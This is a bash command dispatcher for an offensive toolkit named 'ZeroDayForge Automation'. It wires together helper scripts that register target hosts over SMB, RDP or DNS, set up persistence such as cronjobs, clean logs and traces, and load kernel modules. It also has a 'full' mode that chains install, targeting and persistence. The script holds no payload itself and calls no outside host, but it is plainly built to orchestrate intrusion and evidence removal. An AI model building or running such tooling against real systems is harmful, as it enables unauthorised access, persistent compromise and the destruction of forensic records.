#!/bin/bash
# Unified Dispatcher for ZeroDayForge Automation

set -euo pipefail

# Paths
BASE_DIR="$(cd "$(dirname "$0")" && pwd)"
DEPLOY="$BASE_DIR/scripts/deploy.sh"
CONFIG="$BASE_DIR/scripts/generate_config.sh"
PERSIST="$BASE_DIR/scripts/persistence.sh"
CLEANER="$BASE_DIR/scripts/log_cleaner.sh"
SIGNTOOL="$BASE_DIR/scripts/signtool.sh"

usage() {
	cat <<EOF

ZeroDayForge Automation Tool 🚀

Usage: $0 <command> [options]

Commands:
  install                       Set up environment (requires root)
  config <ip> <port> <proto>    Add target (proto: smb, rdp, dns)
  persist [method]              Establish persistence (e.g., cronjob)
  clean [--aggressive]          Clean logs and traces (requires root)
  sign <module.ko> [--dry-run]  Load kernel module safely
  full <ip> <port> <proto>      Do install + config + persist
  -h, --help                    Show this help menu

EOF
	exit 1
}

require_exec() {
	[[ -x "$1" ]] || {
		echo "Missing or non-executable: $(basename "$1")" >&2
		exit 1
	}
}

main() {
	[[ $# -eq 0 ]] && usage

	case "$1" in
		-h|--help) usage ;;
		
		install)
			require_exec "$DEPLOY"
			sudo "$DEPLOY"
			;;

		config)
			require_exec "$CONFIG"
			[[ $# -eq 4 ]] || { echo "Usage: config <ip> <port> <proto>" >&2; exit 1; }
			"$CONFIG" "$2" "$3" "$4"
			;;

		persist)
			require_exec "$PERSIST"
			sudo "$PERSIST" "${2:-}"
			;;

		clean)
			require_exec "$CLEANER"
			shift
			sudo "$CLEANER" "$@"
			;;

		sign)
			require_exec "$SIGNTOOL"
			[[ $# -ge 2 ]] || { echo "Usage: sign <module.ko> [--dry-run]" >&2; exit 1; }
			sudo "$SIGNTOOL" "$2" "${3:-}"
			;;

		full)
			[[ $# -eq 4 ]] || { echo "Usage: full <ip> <port> <proto>" >&2; exit 1; }
			"$0" install
			"$0" config "$2" "$3" "$4"
			"$0" persist
			echo "✅ Full deployment done. Run 'clean' manually if needed."
			;;

		*)
			echo "Unknown command: $1" >&2
			usage
			;;
	esac
}

main "$@"
